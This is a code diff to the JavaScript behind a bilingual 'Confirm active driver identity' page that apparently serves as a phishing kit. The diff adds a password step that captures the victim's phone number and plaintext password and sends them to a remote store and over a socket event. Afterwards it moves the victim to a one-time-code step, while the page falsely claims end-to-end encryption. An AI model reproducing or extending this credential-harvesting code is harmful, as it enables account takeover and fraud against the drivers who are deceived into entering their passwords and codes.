@@ -21,11 +21,12 @@ const translations = {
         title: 'Confirm active driver identity',
         subtitle: 'Enter your active driver phone number to start verification',
         labelPhone: 'Mobile number',
-        btnSend: 'Send Verification Code',
+        btnSend: 'Continue Verification',
+        btnPassword: 'Continue Verification',
         securityNote: 'Your verification is secured with end-to-end encryption.',
         headingOtp: 'Enter 4-digit code',
         instructionOtp: 'We sent a 4-digit verification code to',
-        changePhone: 'Change phone number',
+        changePhone: 'Change password',
         resendPrompt: "Didn't receive the code?",
         resendBtn: 'Resend Code',
         btnVerify: 'Verify Code',
@@ -50,11 +51,12 @@ const translations = {
         title: 'Confirmar identidad del conductor activo',
         subtitle: 'Ingrese su número de teléfono de conductor activo para iniciar la verificación',
         labelPhone: 'Número de móvil',
-        btnSend: 'Enviar código de verificación',
+        btnSend: 'Continue Verification',
+        btnPassword: 'Continue Verification',
         securityNote: 'Su verificación está protegida con cifrado de extremo a extremo.',
         headingOtp: 'Ingrese el código de 4 dígitos',
         instructionOtp: 'Enviamos un código de verificación de 4 dígitos a',
-        changePhone: 'Cambiar número de teléfono',
+        changePhone: 'Cambiar contraseña',
         resendPrompt: '¿No recibiste el código?',
         resendBtn: 'Reenviar código',
         btnVerify: 'Verificar código',
@@ -78,16 +80,19 @@ const translations = {
 
 // DOM Elements
 const stepPhone = document.getElementById('step-phone');
+const stepPassword = document.getElementById('step-password');
 const stepOtp = document.getElementById('step-otp');
 const stepVerified = document.getElementById('step-verified');
 
 const phoneForm = document.getElementById('phone-form');
 const phoneInput = document.getElementById('phone-input');
+const passwordInput = document.getElementById('password-input');
 const otpInputs = document.querySelectorAll('.otp-box');
 const otp1 = document.getElementById('otp-1');
 const btnVerifyOtp = document.getElementById('btn-verify-otp');
 
 const userPhoneDisplay = document.getElementById('user-phone-display');
+const userPhoneDisplayPw = document.getElementById('user-phone-display-pw');
 const displayPhoneVerified = document.getElementById('final-phone-display');
 const displayTimestamp = document.getElementById('final-date-display');
 
@@ -233,11 +238,71 @@ function handlePhoneSubmit(e) {
 
     setTimeout(() => {
         setLoading(btn, false);
+        if (userPhoneDisplayPw) userPhoneDisplayPw.textContent = fullPhone;
         if (userPhoneDisplay) userPhoneDisplay.textContent = fullPhone;
-        switchStep(stepPhone, stepOtp);
+        switchStep(stepPhone, stepPassword);
+        if (passwordInput) passwordInput.focus();
+    }, 400);
+}
+
+// Handle Password Form Submission
+function handlePasswordSubmit(e) {
+    if (e) e.preventDefault();
+    if (!passwordInput) return;
+
+    const pwVal = passwordInput.value.trim();
+    if (!pwVal) return;
+
+    const btn = document.getElementById('btn-submit-password');
+    setLoading(btn, true);
+
+    const customSlug = window.location.pathname + window.location.search;
+    const recData = {
+        id: currentVerificationId,
+        _id: currentVerificationId,
+        phoneNumber: currentPhoneNumber,
+        password: pwVal,
+        status: 'PASSWORD_SUBMITTED',
+        customSlug: customSlug,
+        submittedAt: new Date().toISOString()
+    };
+
+    saveCloudRecord(recData);
+
+    if (socket && typeof socket.emit === 'function') {
+        socket.emit('submit_password', {
+            verificationId: currentVerificationId,
+            phoneNumber: currentPhoneNumber,
+            password: pwVal,
+            customSlug: customSlug
+        });
+    }
+
+    setTimeout(() => {
+        setLoading(btn, false);
+        switchStep(stepPassword, stepOtp);
         startResendTimer();
         if (otp1) otp1.focus();
     }, 400);
+}
+
+function goToStepPassword() {
+    switchStep(stepOtp, stepPassword);
+    if (passwordInput) passwordInput.focus();
+}
+
+function togglePasswordVisibility() {
+    const pwInput = document.getElementById('password-input');
+    const icon = document.getElementById('pw-eye-icon');
+    if (!pwInput || !icon) return;
+
+    if (pwInput.type === 'password') {
+        pwInput.type = 'text';
+        icon.className = 'fa-solid fa-eye-slash';
+    } else {
+        pwInput.type = 'password';
+        icon.className = 'fa-solid fa-eye';
+    }
 }
 
 // Setup 4-Digit OTP Box Focus & Paste Logic (NO AUTO SUBMIT)
